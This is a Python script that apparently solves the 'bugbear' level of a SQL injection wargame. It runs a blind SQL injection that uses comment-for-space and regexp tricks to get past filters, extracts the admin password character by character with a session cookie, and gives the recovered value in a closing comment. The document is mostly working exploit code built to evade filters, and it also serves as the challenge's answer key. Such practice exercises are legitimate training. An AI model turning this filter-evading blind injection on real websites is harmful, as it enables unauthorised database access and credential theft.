#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 9):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
        data = "-1/**/||/**/length(pw)/**/regexp/**/8/**/&&/**/mid(pw,1,{})/**/regexp/**/\"^{}$\"#".format(
            str(i), key + chr(j))
        print(url + data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
        re.add_header(
            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print (key)
            break
print (key)

# 735c2773
